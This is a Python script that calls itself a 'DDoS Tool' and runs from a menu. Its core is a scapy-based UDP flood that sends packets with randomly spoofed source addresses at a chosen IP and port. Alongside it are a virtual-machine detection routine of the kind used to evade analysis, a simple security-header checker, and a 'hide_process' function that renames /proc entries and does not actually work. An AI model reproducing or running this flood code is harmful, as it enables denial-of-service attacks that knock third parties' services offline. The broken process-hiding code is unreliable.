import os
import socket
import random
import time
import requests
from scapy.all import send, IP, UDP
from bs4 import BeautifulSoup
import platform

def hide_process(pid):
    try:
        os.system(f"mv /proc/{pid} /proc/hidden_{pid}")
    except Exception as e:
        print(f"Failed to hide process: {e}")

def start_attack(target_ip, target_port, duration_secs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()

    while time.time() - start_time < duration_secs:
        src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / b'X' * 1024
        send(packet, verbose=False)
        time.sleep(random.uniform(0.01, 0.1))

    sock.close()
    print("Attack finished.")

def scan_vulnerabilities(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        title = soup.title.string if soup.title else 'No title found'
        print(f"Title: {title}")

        # Check for common security headers
        security_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'Strict-Transport-Security']
        for header in security_headers:
            if header in response.headers:
                print(f"{header}: {response.headers[header]}")
            else:
                print(f"{header} header is missing.")
    else:
        print(f"Failed to retrieve the URL. Status: {response.status_code}")

def is_virtual_machine():
    system = platform.system()
    if system == "Linux":
        try:
            dmidecode_output = os.popen("dmidecode -s system-product-name").read().strip()
            virtual_machine_indicators = ["VirtualBox", "VMware", "KVM", "QEMU", "Microsoft Hyper-V", "Xen"]
            return any(indicator in dmidecode_output for indicator in virtual_machine_indicators)
        except Exception as e:
            print(f"Error checking VM on Linux: {e}")
            return False
    elif system == "Windows":
        try:
            wmic_output = os.popen("wmic csproduct get Vendor,Version,IdentifyingNumber").read().strip()
            if "VirtualBox" in wmic_output or "VMware" in wmic_output or "Virtual Machine" in wmic_output:
                return True
        except Exception as e:
            print(f"Error checking VM on Windows: {e}")
            return False
    elif system == "Darwin":
        try:
            sysctl_output = os.popen("sysctl hw.model").read().strip()
            if "Macmini" in sysctl_output or "MacPro" in sysctl_output or "iMac" in sysctl_output or "MacBook" in sysctl_output:
                return False

            vmware_output = os.popen("system_profiler SPSoftwareDataType | grep -i vmware").read().strip()
            parallels_output = os.popen("system_profiler SPSoftwareDataType | grep -i parallels").read().strip()

            return bool(vmware_output or parallels_output)
        except Exception as e:
            print(f"Error checking VM on macOS: {e}")
            return False
    return False

def show_menu():
    while True:
        print("\nDDoS Tool Menu:")
        print("1. Start DDoS Attack")
        print("2. Scan Vulnerabilities")
        print("3. Check if Running on a Virtual Machine")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            target_ip = input("Enter target IP: ")
            target_port = int(input("Enter target port: "))
            duration_secs = int(input("Enter duration (seconds): "))
            start_attack(target_ip, target_port, duration_secs)
        elif choice == '2':
            url = input("Enter URL to scan: ")
            scan_vulnerabilities(url)
        elif choice == '3':
            if is_virtual_machine():
                print("This system is a virtual machine.")
            else:
                print("This system is a real machine.")
        elif choice == '4':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    show_menu()